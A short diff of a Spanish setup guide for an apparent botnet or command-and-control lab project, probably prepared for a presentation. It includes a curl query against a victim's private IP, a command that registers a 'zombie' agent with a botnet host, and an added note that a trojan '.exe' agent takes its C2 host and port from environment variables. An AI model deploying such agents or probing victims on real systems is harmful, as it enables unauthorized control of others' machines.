@@ -153,6 +153,8 @@ curl -s 'http://<IP_PRIVADA_VICTIMA>:19999/api/v1/info' | head -c 200
    sección 8.
 5. Verificar desde otra máquina:
    `python agent/test_agent.py --host <IP_BOTNET> --port 8443 --id zombie-01`
+   El agente `.exe` de `troyano/` usa las variables `C2_HOST`/`C2_PORT` del
+   entorno (ver `troyano/README.md` para compilarlo).
 6. Pruebas antes de la exposición:
    `python3 server/tests/run_all.py` y `python3 server/tests/smoke_test.py`
 
